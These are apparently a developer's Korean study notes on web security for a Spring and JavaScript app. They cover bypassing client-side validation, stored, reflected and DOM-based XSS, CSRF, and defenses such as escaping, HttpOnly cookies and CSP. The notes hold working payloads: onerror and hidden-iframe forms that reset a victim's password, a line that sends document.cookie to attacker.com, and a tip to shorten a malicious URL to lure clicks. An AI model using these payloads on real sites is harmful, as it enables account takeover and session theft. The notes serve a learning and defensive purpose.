## <span style="color:#802548">_console창을 통해 js validation 뚫기_</span>

- js가 global boolean 변수로 확인하는 경우, boolean 변수의 값을 console에서 바꿔서 js를 사실상 우회할 수 있다.
- 특히 변수가 변경되는 eventListener와 그 변수를 활용하는 eventListener가 다른 경우 그러하다.

```js
let isContentBlank = false;
let isNameAlreadyExisted = true;
 window.addEventListener('load', function () {
	document.querySelector("#movie_name").addEventListener('focusout', async function () {
		const movieName = document.querySelector("#movie_name").value;

		const receivedData = {
			movieName,
		}

		const isValid = await validateMovieAndReturnFlag(receivedData);
		if (!isValid) {
			alert('동일한 제목의 영화가 이미 등록되어 있습니다.')
			isNameAlreadyExisted = true;
			return;
		} else {
			isNameAlreadyExisted = false;
		}
	})
})
```

- isNameAlreadyExisted를 console창에서 수동 변경하면 뚫리게 된다.

```js
let isContentBlank = false;
let isNameAlreadyExisted = true;
 window.addEventListener('load', function () {
	document.querySelector("#create").addEventListener("click", async function () {
		const genreDom = document.querySelector("#genre")
		const genre = genreDom.options[genreDom.selectedIndex].value;
		const movieName = document.querySelector("#movie_name").value;
		const movieSummary = document.querySelector("#movie_summary").value;

		const receivedData = {
			genre,
			movieName,
			movieSummary
		}

		if (movieName.trim().length == 0 || movieSummary.trim().length == 0) {
			alert("제목 또는 내용을 입력해 주세요");
			isContentBlank = true;
			return;
		} else {
			isContentBlank = false;
		}

		if (isNameAlreadyExisted || isContentBlank) {
			return;
		}
		// callback 자체에 async, 여기 await 안 붙이면 undefined는 아니지만 pending이라 아래 if문 무의미
		const isCreated = await createMovieAndReturnFlag(receivedData)
		if (isCreated) {
			location.href = '/';
		}
	})
 })
```

- 이를 방지하기 위해 closure를 활용한다.
- 전역 변수를 closure 변수로 변경한다.
- closure란 외부 function에서 쓰이는 변수를 내부 function에서 활용함을 의미한다.
	- clsoure라고 해서 반드시 return function이 필요하지는 않다.
	- load의 eventListener function이 outer fucntion이 된다.
	- focusout의 eventListener function이 inner function이 된다.
		- outer 변수인 isNameAlreadyExisted가 inner에서도 참조되었기 때문에, 유효하다.
		- console창에서 건드리는 건 window.isNameAlreadyExisted기 때문에 조작불가능하다.
		- 대신 이러한 경우는 무조건 validation을 실패로 기본값으로 주고 성공할 떄만 성공으로 변경한다.
```js
 window.addEventListener('load', function () {
	let isContentBlank = false;
	let isNameAlreadyExisted = true;
	document.querySelector("#movie_name").addEventListener('focusout', async function () {
		const movieName = document.querySelector("#movie_name").value;

		const receivedData = {
			movieName,
		}

		const isValid = await validateMovieAndReturnFlag(receivedData);
		if (!isValid) {
			alert('동일한 제목의 영화가 이미 등록되어 있습니다.')
			isNameAlreadyExisted = true;
			return;
		} else {
			isNameAlreadyExisted = false;
		}
	})
})
```

## <span style="color:#802548">_ajax의 경우, network창을 통해 js validation 뚫기_</span>
- ajax로 request를 날리는 경우, network tab을 통해 js validation을 무시하고 바로 ajax를 날릴 수 있다.
- 이 경우는 js단을 우회하는 정도가 아니라, 그냥 무시한다.
- 따라서 backend validation이 필수다.
	- 주로 Spring에서는 start-validation을 활용한다.
	- dependency를 우선 추가해준다.

```java
implementation 'org.springframework.boot:spring-boot-starter-validation'
```

- 추가되었다면 아래처럼 annotation을 통해 제약조건을 걸 수 있다.

```java
public class SampleDTO {

    @NotBlank
    private Integer sampleId;
    
    private String sampleNmae;
}
```

- controller 단에서도 아래처럼 @Valid를 붙여주면 된다.

```java
@GetMapping({"/",""})
    public String index(@ModelAttribute @Valid SampleDTO sampleDTO) {
        
        return new String("index");
    }
```


## <span style="color:#802548">_form의 경우, element창을 통해 js validation 뚫기_</span>
- 직접 element 창에서 값을 조절한 다음에 console 창에 아래처럼 입력하자.
- 그럼 서버에 실제 request가 도달하게 된다.


```js
document.querySelector("form").submit();
```


## <span style="color:#802548">_Stored XSS와 CSRF, js method_</span>
- 게시판을 만들 때 악성 script를 추가하는게 XSS 공격이다.
- 해당 scrip를 통해 서버의 정당한 기능을 이용해 원치 않는 결과를 만드는 게 CSRF다.
	- innerHTML의 경우, tag를 그대로 삽입하기 때문에 악성 XSS 공격에 취약하다.
	- backend에서 걸러주지 않으면 script가 발동될 수 있다.
	- movieName에 tag를 넣었다고 해보자.

```js
document.querySelector("#movie_num").value = movieNum;
document.querySelector("#genre").innerHTML = genre;
document.querySelector("#movie_name").innerHTML = movieName;
document.querySelector("#movie_summary").textContent = movieSummary;
```

- script tag는 browser 자체적으로 무시한다.
- 하지만 script tag를 쓰지 않고도 주요 정보를 빼올 수 있는 방법은 많다.
- image tag도 그 중 하나다. 
- 해당 tag를 제목으로 값을 넣으면 해당 태그의 제목을 누르면 tag가 발동되게 된다.

```js
<img src='x' onerror='alert("공격")'>
```

- 원하는 형태의 출력을 막는 트롤링도 가능하다.
- 아래처럼 내용읍 입력하고 db에 넣게 되면 그 이후의 script들은 전부 주석처리되어 원하는 출력이 되지 않는다.

```js
<script> /*
```

- html을 넣는 다른 함수 insertAdjacsentHTML도 마찬가지다.
- reviewText로 위의 tag를 넣으면 공격이 발동된다.
- 즉 HTML을 그대로 넣는 method들은 모두 위험하다고 볼 수 있다.

```js
for (const item of reviews) {
	const { reviewerNickName, reviewText, score, reviewDate } = item;
	const html = `
			<tr>
				<td>${reviewerNickName}</td>
				<td>${reviewText}</td>
				<td>${score}</td>
				<td>${makeTime(reviewDate)}</td>
			</tr>
	`
	//무조건 beforeend, beforebegin으로 하면 tbody가 id가 없는 것으로 매번 새로 생성됨.
	document.querySelector("#generate_area").insertAdjacentHTML('beforeend', html);
}
```

- 그럴 땐 HTML Entity를 전부 변환해줘야 한다.

```js
function escapeHTML(str) {
    return str.replace(/&/g, "&amp;")
              .replace(/</g, "&lt;")
              .replace(/>/g, "&gt;")
              .replace(/"/g, "&quot;")
              .replace(/'/g, "&#039;");
}

for (const item of reviews) {
	const { reviewerNickName, reviewText, score, reviewDate } = item;
	const html = `
			<tr>
				<td>${escapeHTML(reviewerNickName)}</td>
				<td>${escapeHTML(reviewText)}</td>
				<td>${score}</td>
				<td>${makeTime(reviewDate)}</td>
			</tr>
	`
	document.querySelector("#generate_area").insertAdjacentHTML('beforeend', html);
}
```


## <span style="color:#802548">_stored XSS와 CSRF, 실제 공격_</span>
- 게시글 내용에 유저네임과 아래와 같이 삽입하자.
	- userID를 가져오는 로직은 각 사이트마다 다르니 노가다 좀 해서 알아낸 뒤 "abcd" 대신 로그인 사용자의 id를 넣게 바꾼다.
	- 서버에서 SpringSecurity의 id를 동적으로 가져오는 경우는 id 값을 추가할 필요도 없다.
- text(), textContent는 괜찮지만, innerHTML 형태의 js는 아래 ajax가 반드시 발동하게 된다.
- 아래는 fetch 버전이다.

```js
<img src="x" 
     onerror='
        fetch("/changePassword", { 
            method: "POST", 
            credentials: "include", 
            headers: { "Content-Type": "application/json" }, 
            body: JSON.stringify({ 
                userId: "abcd", 
                userPwd: "hacked_password" 
            }) 
        });'
>
```

- form submit으로도 가능하다.

```js
<img src="x" onerror="
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/changePassword';  // Target endpoint

    var input1 = document.createElement('input');
    input1.type = 'hidden';
    input1.name = 'userId';
    input1.value = 'abcd';

    var input2 = document.createElement('input');
    input2.type = 'hidden';
    input2.name = 'userPwd';
    input2.value = 'hacked_password';

    form.appendChild(input1);
    form.appendChild(input2);
    document.body.appendChild(form);
    form.submit();
">
```

- image tag가 아닌 iframe으로도 가능하다.
- iframe을 이용하면 창 크기가 0이 되기 때문에 사용자가 모르게 보낼 수 있다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Hidden Attack</title>
</head>
<body onload="document.getElementById('hackForm').submit();">

    <iframe name="attackFrame" style="display:none;"></iframe>

    <form id="hackForm" action="https://target.com/changePassword" method="POST" target="attackFrame">
        <input type="hidden" name="userId" value="1234">
        <input type="hidden" name="newPassword" value="hacked123">
        <input type="hidden" name="confirmPassword" value="hacked123">
    </form>

</body>
</html>
```

## <span style="color:#802548">_순수 stored XSS와 CSP_</span>
- CSRF와 결합되지 않고도 stored XSS는 사용할 수 있다.
- Same Origin Policy를 채택하지 않은 경우, 해당 사이트의 정보를 다른 사이트에 가져갈 수가 있다.

```js
document.location = "https://attacker.com/steal?cookie=" + document.cookie;
```

- 이를 막기 위해서는 SOP 출처정책 및 HTTP ONLY cookie를 사용해야 한다.
- 인증에 사용되는 JSESSIONID cookie의 경우, Spring Security를 사용하면 기본 값이 HTTPONLY다.
- 따라서 실험을 위해서 잠시 HTTPONLY를 해제해준다.

```yaml
# application.properties
server.servlet.session.cookie.http-only=false
```

- 해제하고서 아래처럼 넣어주면 JSESSIONID 값이 보인다.

```html
<img src="" onerror="alert(document.cookie)"/>
```

- CSRF까지는 허용해도, 이것을 들고 상대 site에 가지않게끔 막아야 한다.
- 그러한 경우에 CSP header를 사용할 수 있다.
- Spring Security를 사용하면 더 간단하게 만들 수 있다.

```java
http.headers(headers -> headers
		.contentSecurityPolicy(policy -> policy
				.policyDirectives(
						"default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'")));
```

- 보고를 보내는 기능도 있다고 하는데, 잘 안된다.
- Security에서 아래처럼 설정해준다.

```java
http.headers(headers -> headers
		.contentSecurityPolicy(policy -> policy
				.policyDirectives(
						"default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; report-uri http://localhost:9900/csp-report-endpoint; report-to csp-endpoint")));

http.headers(t -> t.addHeaderWriter((request, response) -> {
	response.setHeader("Reporting-Endpoints", "csp-endpoint=\"http://localhost:9900/csp-report-endpoint\"");

}));
```

- Controller를 만들어준다.
- 되는 때도 있고, 안 되는 때도 있어서 정확한 원인을 잘 모르겠다.

```java
@PostMapping("/csp-report-endpoint")
@ResponseBody
public ResponseEntity<Void> reportCSPViolation(@RequestBody String report) {
	log.info("CSP Violation: " + report);
	return ResponseEntity.ok().build();
}
```

- 위의 csp header는 모든 inline script를 불허한다.
- inline script 불허라는 의미는, script로 시작되는 것이 불허된다는 의미다.
	- 그러나 inline으로 우리가 심어둔 아래의 HTML 내 eventListener인 onsubmit()은 동작한다.
	- 대신 onkeyup(), onclick()은 동작하지 않고, style tag는 불허한다.
	- 아마 onsubmit()을 제외하곤 전부 작동하지 않는 것으로 보인다. 

```js
<script>
//작동X. console에 오류 보임.
</script>
<input type="submit" id="submitBtn" value="로그인" class="btn btn-primary" onsubmit="login()"> /*작동*/
<input type="button" id="submitBtn" value="로그인" class="btn btn-primary" onclick="login()"> //작동X. console에 오류.
<input type="text" name="userId" id="userId" placeholder="ID 입력" onkeyup="confirmId()"> //작동X. console에 오류.

<div id="confirmPwd" style="font-size: 0.8em;"></div>  //작동X. console에 오류.
```

- 공격자가 넣은 나쁜 malicious script는 어떻게 될까?
- 당연히 error가 난다. run되지 않게 막힌다는 의미다.

```js
<img src="" onerror="alert(document.cookie)" //아래처럼 console에 error 뜸.
//Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), 
//or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present.
```

- SPA의 경우에는 어떨까?
- 하지만 SPA의 경우 html과 js를 보통 같이 쓴다.
- 이러한 경우 strict-dynamic과 nonce를 활용한다.

```java
http.headers(headers -> headers
    .contentSecurityPolicy(policy -> policy
        .policyDirectives("script-src 'self' 'strict-dynamic' 'nonce-abc123';")));
```

- vite 기준으로는 npm install --save-dev @vitejs/plugin-html로 깔아준다.
- 아래와 같이 설정해준다.

```js
import { defineConfig } from 'vite';
import html from '@vitejs/plugin-html';
import crypto from 'crypto';

// Function to generate a nonce
const generateNonce = () => {
  return crypto.randomBytes(16).toString('base64');
};

export default defineConfig({
  plugins: [
    html({
      inject: {
        injectNonce: generateNonce(),
      },
    }),
  ],
});
```

- index.html에서 script를 넣는 app.js를 아래와같이 만들어준다.
- nonce 값을 넣어주자. vite의 경우, nonce는 injectNonce로 넣는다.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="/favicon.ico">
    <title>reservation-front</title>
    
    <!-- Use the injected nonce in the script tags -->
    <script defer src="/js/chunk-vendors.js" nonce="{{ injectNonce }}"></script>
    <script defer src="/js/app.js" nonce="{{ injectNonce }}"></script>
  </head>
  <body>
    <noscript>
      <strong>We're sorry but reservation-front doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```


## <span style="color:#802548">_Reflected XSS와 주소창의 경우, 악성 script 넣기_</span>
- searchWord가 utext로서, xss attack에 취약한 방식이다.

```html
<form th:action="@{/board/boardList}" method="GET" id="searchForm">
	<input type="hidden" name="page" value="" id="requestPage">
	<select name="searchItem" id="searchItem">
		<option value="boardTitle"   th:selected="${searchItem == 'boardTitle'}">  글제목</option>
		<option value="boardWriter"  th:selected="${searchItem == 'boardWriter'}"> 작성자</option>
		<option value="boardContent" th:selected="${searchItem == 'boardContent'}">글내용</option>
	</select>
	<input type="text" name="searchWord" id="searchWord" th:utext="${searchWord}">
	<input type="submit" id="search" value="검색" class="btn btn-primary">
</form>
```

- keyword 같은 곳에 아래와 같은 script를 집어넣는다.

```js
<script>alert("개인정보꿀꺽ㅅㄱ")</script>
```

- 그럼 script가 실행되는 것을 볼 수 있다.
- 반면에, th:utext가 아닌 th:value를 쓰게 되면 thymeleaf에서 기본 escape를 수행하기에 script가 실행되지 않는다.

- xss가 뚫리는 걸 확인했다면, 해당 url을 shortenURL로 만들어서 클릭을 유도한다. 
- 그럼 내 cookie들이 털리고, 그 중에 민감 정보가 있다면 털리게 된다.
- js로만 만들었다면, 별도의 escape가 필요하다.



## <span style="color:#802548">_DOM-based XSS_</span>

- dom-based xss의 경우에는, query string이 경로가 되는 경우가 많다.
- 주소창에서 들어오는 query parameter에 기반해 dom을 생성하는 경우가 있다.
	- 그런데 그 생성방법이 문제다.
		- document.write()인 경우
		- innerHTML인 경우
		- Element.insertAdjacentHTML()인 경우
		- setTimeout()인 경우
		- location.href인 경우 등이다.


- document.write(), innerHTML, insertAdjacentHTML는 아래와 같은 경우에 털리게 된다.

```html
<form th:action="@{/board/boardList}" method="GET" id="searchForm">
	<input type="hidden" name="page" value="" id="requestPage">
	<select name="searchItem" id="searchItem">
		<option value="boardTitle"   th:selected="${searchItem == 'boardTitle'}">  글제목</option>
		<option value="boardWriter"  th:selected="${searchItem == 'boardWriter'}"> 작성자</option>
		<option value="boardContent" th:selected="${searchItem == 'boardContent'}">글내용</option>
	</select>
	<input type="text" name="searchWord" id="searchWord" th:value="${searchWord}">
	<input type="submit" id="search" value="검색" class="btn btn-primary">
</form>

<script>
let pos = document.URL.indexOf("searchWord=") + 8;
document.write(decodeURIComponent(document.URL.substring(pos)));
</script>
```

- 역시 막으려면 escape가 필수다.
- 그 외에는 tag를 whiteList로 쓰는 방법이 있다.


## <span style="color:#802548">_XSS, CSRF 방지법_</span>

- XSS들을 방지하기 위해서는 
	- innerHTML, insertAdjacsentHTML, html() --> text(), textContent 등 text 값 기반으로 전부 변경
	- innertHTML을 쓰는 대신, HTML Entity는 전부 escape 하기.
	- http only cookie로 Spring 서버에서 설정 --> cookie를 js에선 읽을 수 없어 session cookie 값 탈취 불가
	- CSRF 도입 --> 사람마다 발급되는 csrf token이 다르니 값 넣기 불가.
	- CSP 헤더를 self로 고정 --> 임의로 삽입된 script 전부 run 안함.
	- 중요 기능은 추가 인증하게 변경

//TODO. CSRF token 도입
```
f
```

## <span style="color:#802548">_SSRF_</span>
SSRF



